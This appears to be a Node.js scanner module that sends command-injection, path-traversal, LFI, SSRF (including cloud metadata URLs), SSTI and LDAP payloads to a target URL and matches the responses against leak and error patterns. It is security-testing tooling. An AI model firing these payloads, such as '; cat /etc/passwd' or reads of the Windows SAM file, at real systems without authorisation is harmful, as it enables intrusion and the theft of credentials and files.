const axios = require('axios');

// Additional injection tests beyond XSS and SQLi
const COMMAND_INJECTION_PAYLOADS = [
  { payload: '; ls', name: 'Semicolon ls', category: 'command' },
  { payload: '| whoami', name: 'Pipe whoami', category: 'command' },
  { payload: '$(whoami)', name: 'Command substitution', category: 'command' },
  { payload: '; cat /etc/passwd', name: 'Cat passwd', category: 'command' },
  { payload: '& net user', name: 'Windows net user', category: 'command' },
  { payload: '|| sleep 5', name: 'Sleep injection', category: 'command' },
];

const PATH_TRAVERSAL_PAYLOADS = [
  { payload: '../../../etc/passwd', name: 'Unix passwd (3 levels)', category: 'path-traversal' },
  { payload: '../../../../../etc/passwd', name: 'Unix passwd (5 levels)', category: 'path-traversal' },
  { payload: '..\\..\\..\\windows\\system32\\config\\sam', name: 'Windows SAM', category: 'path-traversal' },
  { payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', name: 'URL encoded traversal', category: 'path-traversal' },
  { payload: '/etc/passwd%00.jpg', name: 'Null byte bypass', category: 'path-traversal' },
];

const LFI_PAYLOADS = [
  { payload: '/etc/passwd', name: 'Direct LFI passwd', category: 'lfi' },
  { payload: '/proc/self/environ', name: 'LFI environ', category: 'lfi' },
  { payload: 'php://filter/convert.base64-encode/resource=index.php', name: 'PHP filter wrapper', category: 'lfi' },
  { payload: 'file:///etc/passwd', name: 'File protocol', category: 'lfi' },
];

const SSRF_PAYLOADS = [
  { payload: 'http://127.0.0.1', name: 'Localhost', category: 'ssrf' },
  { payload: 'http://169.254.169.254/latest/meta-data/', name: 'AWS instance metadata', category: 'ssrf' },
  { payload: 'http://metadata.google.internal/', name: 'GCP metadata', category: 'ssrf' },
  { payload: 'http://10.0.0.1', name: 'Private network', category: 'ssrf' },
];

const SSTI_PAYLOADS = [
  { payload: '{{7*7}}', name: 'Jinja2 SSTI', expected: '49', category: 'ssti' },
  { payload: '${7*7}', name: 'Freemarker SSTI', expected: '49', category: 'ssti' },
  { payload: '#{7*7}', name: 'Thymeleaf SSTI', expected: '49', category: 'ssti' },
  { payload: '{{config}}', name: 'Flask config leak', expected: '', category: 'ssti' },
];

const LDAP_PAYLOADS = [
  { payload: '*', name: 'LDAP wildcard', category: 'ldap' },
  { payload: '*)(uid=*))(|(uid=*', name: 'LDAP injection', category: 'ldap' },
];

const ERROR_INDICATORS = [
  /root:.*:0:0/i, /daemon:.*:1:1/i,
  /\buid=\d+/i, /\bgid=\d+/i,
  /directory listing/i, /index of/i,
  /syntax error/i, /parse error/i,
  /stack trace/i, /exception/i, /traceback/i,
  /warn.*php/i, /fatal.*error/i,
  /internal server error/i,
  /undefined.*variable/i, /null.*pointer/i,
  /command not found/i, /permission denied/i,
];

const PARAMS = ['url', 'file', 'path', 'page', 'cmd'];  // only 5 params
const BATCH_SIZE = 6;
const SCANNER_TIMEOUT = 60000; // 60s hard cap

async function scan(targetUrl) {
  const results = { findings: [], tests: [] };
  const deadline = Date.now() + SCANNER_TIMEOUT;

  const safeGet = (url) =>
    axios.get(url, {
      timeout: 5000, maxRedirects: 2, validateStatus: () => true,
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36' }
    }).catch(() => null);

  try {
    const allPayloads = [
      ...COMMAND_INJECTION_PAYLOADS,
      ...PATH_TRAVERSAL_PAYLOADS,
      ...LFI_PAYLOADS,
      ...SSRF_PAYLOADS,
      ...SSTI_PAYLOADS,
      ...LDAP_PAYLOADS,
    ];

    // Run payloads in parallel batches
    for (let i = 0; i < allPayloads.length; i += BATCH_SIZE) {
      if (Date.now() > deadline) break;

      const batch = allPayloads.slice(i, i + BATCH_SIZE);
      const batchResults = await Promise.all(batch.map(async (injection) => {
        for (const param of PARAMS) {
          if (Date.now() > deadline) break;
          try {
            const testUrl = new URL(targetUrl);
            testUrl.searchParams.set(param, injection.payload);
            const r = await safeGet(testUrl.toString());
            if (!r) continue;
            const body = typeof r.data === 'string' ? r.data : '';

            for (const pattern of ERROR_INDICATORS) {
              if (pattern.test(body)) {
                return { param, injection, type: 'error', severity: 'critical' };
              }
            }

            if (injection.expected && body.includes(injection.expected)) {
              return { param, injection, type: 'ssti', severity: 'critical' };
            }
          } catch { /* skip */ }
        }
        return { injection, type: 'safe' };
      }));

      for (const res of batchResults) {
        if (res.type === 'error' || res.type === 'ssti') {
          results.findings.push({ param: res.param, payload: res.injection.name, category: res.injection.category, severity: 'critical' });
          results.tests.push({ id: `inj-${res.param}-${res.injection.name.replace(/\s/g, '-')}`, name: `${res.injection.category.toUpperCase()}: ${res.param} (${res.injection.name})`, status: 'fail', severity: 'critical' });
        } else {
          results.tests.push({ id: `inj-safe-${results.tests.length}`, name: `${res.injection.category.toUpperCase()} safe: ${res.injection.name}`, status: 'pass', severity: 'info' });
        }
      }
    }

  } catch (err) {
    results.error = `Injection scan failed: ${err.message}`;
  }
  return { scanner: 'Advanced Injections', icon: '🔓', results, testCount: results.tests.length };
}

module.exports = { scan };
